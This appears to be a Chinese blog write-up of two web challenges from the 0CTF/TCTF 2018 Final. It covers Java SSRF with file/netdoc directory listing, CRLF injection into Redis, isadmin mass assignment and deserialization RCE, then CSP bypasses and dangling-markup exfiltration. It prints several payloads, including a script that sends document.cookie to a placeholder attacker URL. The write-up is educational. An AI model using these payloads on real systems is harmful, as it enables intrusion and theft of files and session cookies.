---
title: 0CTF/TCTF2018 Final Web Writeup
date: 2018-05-31 01:49:58
tags:
- java
- xss
- csp
- ssrf
- redis
---

最棒的CTF就是那个能带给你东西和快乐的CTF了，共勉

<!--more-->

# show me she shell #

这是一道tomato师傅出的不完整的java题，java...，java...我恨java┑(￣Д ￣)┍

这是一个题目一是列目录+任意文件读取，

二是垂直越权+CLRF配SSRF打redis+反序列化命令执行

题目的难度在于代码本身的不完整和java，没办法实际测试，所以只能强行阅读源码，幸运的是代码结构是spring完成的，和python的flask/django结构很强，这为我们阅读源码提供了可能。

## 1 ##

整个代码中，控制器只有5个，其中
```
index 首页
login 登陆、注册
manager 管理员管理
post 用户发送post
user 用户功能，包括上传头像和删除自己发送的post
```

entity是python中类似于model的定义，其中包括了User、Post

interceptor主要负责路由以及权限设置，核心代码如下
```
 @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response, Object handler) throws Exception {

        String requestUri = request.getRequestURI();
        for (String s : excludedUrls) {
            if (requestUri.endsWith(s)) {
                return true;
            }
        }
        User user =  (User) request.getSession().getAttribute("user");
        if(user == null){
            request.getRequestDispatcher("/WEB-INF/pages/login.jsp").forward(request, response);
            return false;
        }else{
            return true;
        }
    }
```
通过request.getRequestURL获取连接，其中后缀在excludedUrls的不需要登陆，其他都需要登陆才能访问。

关于excludedUrls的设置在配置文件中
```
<mvc:interceptors>
    <mvc:interceptor>
        <mvc:mapping path="/**"/>
        <bean class="com.tctf.interceptor.AuthInterceptor">
            <property name="excludedUrls">
                <list>
                    <value>/register.do</value>
                    <value>/login.do</value>
                    <value>/doregister.do</value>
                </list>
            </property>
        </bean>
    </mvc:interceptor>
</mvc:interceptors>
```

mapper其中包含了部分核心函数，但只有函数定义，没有代码

service中包含了关于user操作和post操作的核心函数

utiles是一些其余的核心函数

第一个漏洞点其实比较容易发现，在user的控制器中我们可以看到关于更换头像的函数

```
@RequestMapping(value = "/headimg.do",method = RequestMethod.GET)
public void UpdateHead(@RequestParam("url")String url){
    String downloadPath = request.getSession().getServletContext().getRealPath("/")+"/headimg/";
    String headurl = "/headimg/"+ HttpReq.Download(url,downloadPath);
    User user = (User) session.getAttribute("user");
    Integer uid = user.getId();
    userMapper.UpdateHeadurl(headurl,uid);
}
```
关于获取头像的地方调用了HttpReq.Download函数

```
public static String Download(String urlString,String path){
    String filename = "default.jpg";
    if(endWithImg(urlString)) {
        try {
            URL url = new URL(urlString);
            URLConnection urlConnection = url.openConnection();
            urlConnection.setReadTimeout(5*1000);
            InputStream is = urlConnection.getInputStream();
            byte[] bs = new byte[1024];
            int len;
            filename = generateRamdonFilename(getFileSufix(urlString));
            String outfilename = path + filename;
            OutputStream os = new FileOutputStream(outfilename);
            while ((len = is.read(bs)) != -1) {
                os.write(bs, 0, len);
            }
            os.close();
            is.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    return filename;
}
```
这里调用URL类来获取返回

```
URL url = new URL(urlString);
URLConnection urlConnection = url.openConnection();
```
但这之前我们需要绕过endWithImg的判断

```
private static boolean endWithImg(String imgUrl){
    if(StringUtils.isNotBlank(imgUrl)&&(imgUrl.endsWith(".bmp")||imgUrl.endsWith(".gif")
            ||imgUrl.endsWith(".jpeg")||imgUrl.endsWith(".jpg")
            ||imgUrl.endsWith(".png"))){
        return true;
    }else{
        return false;
    }
}
```

函数比较清楚，对图片链接的结尾做了判断，也很好绕过，我们可以用形似
```
http://11111/111.php?a=1.jpg
```

就可以直接绕过判断了，这里还算比较明白，我们可以直接用file协议去读本地文件，形似`file:///etc/passwd?a=1.jpg`就可以获取文件内容了。

唯一的问题是，我们如何找到flag位置了，这就涉及到一个小trick了

**在java中，我们可以用file:///或netdoc:///来列目录**

通过这种方式，我们可以获取到服务器上的第一个flag

## 2 ##

当然这里的第一题是当时的非预期，因为这种列目录方式只在java中才有，我们回到题目继续分析。

在第一题中我们找到了一个SSRF漏洞，在第二题中，修复了headimg使用file协议读文件的漏洞，但我们可以用CRLF向Redis写入数据。

```
headimg.do?url=http://127.0.0.1%0a%0dSET%20A%20A:6379
```
-->
```
redis set A A
```
但是有什么用呢？

让我们再回到题目代码

在managercontroller中，我们可以发现所有关于redis的操作都在这里，但这里有一个限制是要求当前用户的isadmin必须为1，但整个代码中并没有任何关于这部分的操作，所以我们顺着回顾代码中可能接触到设置isadmin的位置。

跟入注册代码controller.LoginController中，关于注册的代码如下：
```
@RequestMapping(value = "/doregister.do",method = RequestMethod.POST)
public String DoRegister(User user, String repassword, Model model){
    String result = userService.register(user,repassword);
    if(result.equals("ok")){
        return "login";
    }else{
        model.addAttribute("message",result);
        return "register";
    }
}

@RequestMapping(value = "/register.do",method = RequestMethod.GET)
public String Register(){
   return "register";
}
```

跟入userService.register函数
```
public String register(User user,String repassword) {
    String username = user.getUsername();
    String password = user.getPassword();

    if(StringUtils.isBlank(username.trim()) || StringUtils.isBlank(password.trim())){
        return "You need set username and password";
    }   

    int uid = userMapper.SelectIdByUsername(username);

    if(uid>0){
        return "This username has been registered!";
    }

    if(!password.equals(repassword)){
        return "repassword";
    }

    userMapper.InsertUser(user);

    return "ok";
}
```

仔细观察我们可以发现，虽然函数中从user中获取了username和password并进入`userMapper.SelectIdByUsername`验证，但在插入数据的时候仍然直接传入了user类。

这里我们看看user类的定义（这应该是类似于python中model的定义方式）
```
public class User{
    private Integer id;
    private String username;
    private String password;
    private String headurl;
    private Boolean isadmin;

    public User(Integer id, String username, String password, String headurl, Boolean isadmin) {
        this.id = id;
        this.username = username;
        this.password = password;
        this.headurl = headurl;
        this.isadmin = isadmin;
    }
...
```

我们可以注意到这个函数在初始化时接受了isadmin，而在控制器中路由接收到这个参数时也没有做任何的处理，所以这里存在**AutoBuilding漏洞**

当我们在注册的时候，原post参数为
```
username=test&password=test&repassword=test
```
我们只要加入isadmin即可
```
username=test&password=test&repassword=test&isadmin=1
```

我们成功给当前用户加入了管理员权限

在获得了manager权限后，我们就可以执行manager控制器下的操作了，让我们来看看代码

```
    @RequestMapping(value = "/audit.do")
    public String AuditPost(@RequestParam("pid") Integer pid,HttpSession session) {
        User user = (User) session.getAttribute("user");
        try {
            if (user.getIsadmin()) {
                postMapper.AuditPost(pid);
                Post post = postMapper.GetOne(pid);
                redisClient.set(pid,post);
                return "manager";
            }
        }catch (Exception e){
            return "redirect:/";
        }
            return "redirect:/";
    }

    @RequestMapping(value = "/check.do")
    public String CheckPost(@RequestParam("pid") Integer pid, HttpSession session, Model model){
        User user = (User) session.getAttribute("user");
        try {
            if (user.getIsadmin()) {
                Post post = redisClient.getObject(pid);
                model.addAttribute("post", post);
                return "manager";
            }
        }catch(Exception e){
                return "redirect:/";
            }
                return "redirect:/";
        }
```

这其中有一个特殊的操作就是对于redis的操作，关于redis的代码在utils.RedisClient中

```
public <T> void set(Integer id, T t) {
    byte[] key = getKey(id);
    RedisSerializer serializer = redisTemplate.getValueSerializer();
    byte[] val = serializer.serialize(t);
    getConnection().set(key, val);

}

public <T> T getObject(Integer id) {
    byte[] key = getKey(id);
    byte[] result = getConnection().get(key);
    return (T) redisTemplate.getValueSerializer().deserialize(result);
}
```

很明显其中的getObject函数有反序列化的操作，如果我们想要通过反序列化来构造RCE的话，我们需要一个gadget.

这里tomato用了`SpringAbstractBeanFactoryPointcutAdvisor`
[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

这下思路就非常清晰了，整个利用链如下

注册->使用AutoBuilding越权登陆->使用headimg的ssrf配合crlf向redis中写入序列化数据->check.do反序列化->RCE

完整exp如下

[https://gist.github.com/Tom4t0/97708be968cc3623c74ef860ae031574](https://gist.github.com/Tom4t0/97708be968cc3623c74ef860ae031574)


# h4x0rs.data #

膜@l4wio，还是那句话，CTF只是安全的一种表现形式，能从CTF获得东西，那真是一种很棒的体验了。

题目条件极多，但限制很大，导致的结果就是有非常多有趣的解法，虽是非预期，但利用点却非常巧妙

## 题目分析 ##

```
Hi folks 
Once upon a time, I made a matching-dot-com-like website, you can find your soulmates here < 3. It's very old source-code (even it's still using `strip_tags`...) . 
Recently, I've found out some papers tell that I should enable CSP...gee... I'm lazy to do insert nonce everywhere, but... guess what ? I found out the way to enable CSP in ...clever (weird) way. So I just need to append a `script` tag right before body website, sounds cool huh ? 
Moreover, to protect our users (h4x0rs) from ... strangers harrasing on the internet. User id always be renewed after an user login, wow, amazing. But you can still follow them by clicking like button. 
Here is my public (aka. not-admin) account. Like me before it's too late ❤ 
In case you want to some `flag` cookie. Let's find my private account and get the flag. Good luck!
```

一个有趣的网站，其中有一些特点
- 网站有登陆注册（有身份权限区分，admin用户登陆会设置flag cookie？）
- 每个用户都有一个对应id，每次relogin这个id都会变，旧的id都会失效
- 这个id除了在`profile.php?id={id}`用于展示对应id，还用于`like.php?id={id}`喜欢
- 我们只能看到喜欢的人，在这里可以一直看到id，即使id变化也可以跟着变化
- 页面开头设置了no-referrer
```
<meta name="referrer" content="no-referrer">
```
- 页面head的最后面用过外链的方式引入js来设置csp
```
<script src='https://h4x0rs.date/assets/csp.js?id=9beeb6b41c90040a4dcfa5196d1b0367560d9969f5f9151acce2d3ff54938f2d&page=profile.php'></script>


meta = document.createElement('meta');
meta.httpEquiv='Content-Security-Policy';
meta.content="script-src 'nonce-9beeb6b41c90040a4dcfa5196d1b0367560d9969f5f9151acce2d3ff54938f2d_profilephp_6df92500e3891a9b8d0b16dafa0c11b9'";
document.head.appendChild(meta);
```
这样一来，CSP是通过引入js生效的。

- profile.php页面没有任何过滤，只受到CSP限制

仔细思考上面的各种条件之后，我们起码需要完成两步，一是获取到admin的id，二是
构造xss来获取cookie。

## 获取id ##

首先我们需要找个能够获取id的地方，这里预期加上非预期有两种解法。

第一种是我当时使用的登陆跳转

当你在登陆情况下，如果访问login.php时，会跳转到redirect参数制定的位置，有趣的是，这里redirect虽然有限制，无法跳出当前域，但它却是通过拼接来构造跳转的，例如：
```
https://h4x0rs.date/login.php?msg=Please login&redirect=profile.php
```
就会跳转到
```
https://h4x0rs.date/profile.php?id={my_id}
```

但我们如果把redirect设置为
```
profile.php?id={your_id}&a=
```
就会跳转到
```
profile.php?id={your_id}&a={my_id}
```

然后，我们在your_id对应的profile中写入标签，这里有个小tricks

**用meta引入的referrer设置是可以被覆盖的**

payload:
```
</textarea><meta name="referrer" content="always"><img src={xss_url}></h3>
```

通过这种方式，我们就可以拿到admin bot上的admin_id，然后like它就可以了

当然这只是我使用的方法，还有出题人的解法。

我们回顾profile.php页面的结构，当我们喜欢一个用户后，该用户就会出现在profile.php编辑页面的最下面。

在页面中，有一个很特殊的点在于，整个页面的所有标签属性都是用双引号包裹的，也就是说如果我们在profile处写入
```
</textarea><img src='{xss_url}?a=
```

那么单引号就会包裹后面的所有内容，问题在于我们如何闭合这里的单引号呢，而且chrome有一个特性，**chrome会block所有请求URL中带有\n \r \t的请求**。

而且在注册名字的时候会过滤左尖括号以后的字符，但我们仍然可以通过右尖括号、单引号来闭合前面的img标签。

这里我们注册
```
test' src='{xss_url}?a=

test'>
```
两个账号，并设置profile为

```
</textarea><img a='
```

整个当前页面就会变为类似于这样的结构

```
</textarea><img a='...
...# 包含\r\n \t的垃圾信息
test' src'{xss_url}?a=....like?id{maybe_for_admin}....test'>
```

我们可以成功获得这部分页面的内容，这种攻击方式又叫**data exfiltration 数据泄露**

同样的，我们也可以通过引入css的方式来获取页面内容
```
<style>
...
...
*{}@import url('{xss_url}
...
');
```

这种引入方式的好处在于，他不受到换行的印象，所以比前一个更容易拿到数据。

获得目标之后，我们又要回到题目本身，既然是要拿到cookie，我们就必须找到绕过CSP的方法

## XSS ##

### 预期解 ###

仔细观察加载csp的请求时，我们可以发现一个特殊的设置
```
Cache-Control	
max-age=20
```
没错，在网站的assert目录，服务端开启了缓存

在我们在得知adminid的情况下，我们可以提前发送一次请求缓存，获取到nonceid之后，再构造xss。

整个利用链如下:
- 请求admin_id的js链接
```
<script src='https://h4x0rs.date/assets/csp.js?id=77e7528f65be043dee7def9a765a891488678997b946e48c39586c750fd6aee0&page=profile.php'></script>
```

- 然后解析nonce id
```
<script>
	setTimeout(()=>{
	
	var nonce = document.head.children[2].getAttribute('content').slice(18,-1);
	console.log(nonce);
	var f = document.body.appendChild(document.createElement('iframe'));
	f.src = 'x2.html#'+nonce;
	},2000);

</script>
```
- 用解析到的id构造xss
```
intro.textContent = "</textarea><script nonce="+location.hash.slice(1)+">alert(document.cookie);</scr"+"ipt>";
```
- csrf修改当前profile.php
```

<form action="https://h4x0rs.date/profile.php" method=POST>

<textarea id=intro name=intro>
</textarea>

</form>

<script>
	intro.textContent = "</textarea><script nonce="+location.hash.slice(1)+">alert(document.cookie);</scr"+"ipt>";
	document.forms[0].submit();
</script>

```
- getflag

值得一题的是，由于id会不停的变化，所以如何动态构造payload或如何在一次请求中完成攻击是这个题原来思路最大的难点...


### 非预期解 ###

在比赛结束后，[@tyage](https://twitter.com/tyage/status/1001307576296861696)在twitter公布了一个非预期解，其中利用的方式非常有意思。

在关于CSP的标准中，iframe有一个csp属性，用于设置iframe引入页面时，为页面加载设置csp

[https://w3c.github.io/webappsec-csp/embedded/#csp-attribute](https://w3c.github.io/webappsec-csp/embedded/#csp-attribute)

形似
```
<iframe csp='...'>
```
在这里我们可以注意到，csp是通过js引入meta设置的，这里就有了优先级问题，在iframe引入一个页面时为其设置了csp，首先我们需要明白的一件事情是，通过meta设置的多个CSP是会同时生效。

但浏览器解析是逐句执行的，假设我们通过iframe的csp做如下的设置
```
test<iframe src=/profile.php?id=b0ad3eba1569915665b4452a5ca0c816a33c1d64f11d1a99fa3d1ee402aad3c8 csp="script-src 'unsafe-inline';">
```

那么profile.php这个页面首先就会存在第一个CSP unsafe-inline，这个CSP会直接作用于下面的js解析，包括通过script引入的csp.js，就会被拦截。

这样一来，当前页面的有效CSP就为unsafe-inline，我们下面插入的代码就会成立

利用链如下：
- 注册user1，设置profile内容为
```
<script>location.href='{xss_url}?a=document.cookie'</script>
```
- 获取该id为user1_id
- 注册user2，设置profile内容为
```
test<iframe src=/profile.php?id={user1_id} csp="script-src 'unsafe-inline';">
```
- 获取user2_id，然后发送给管理员
- get flag
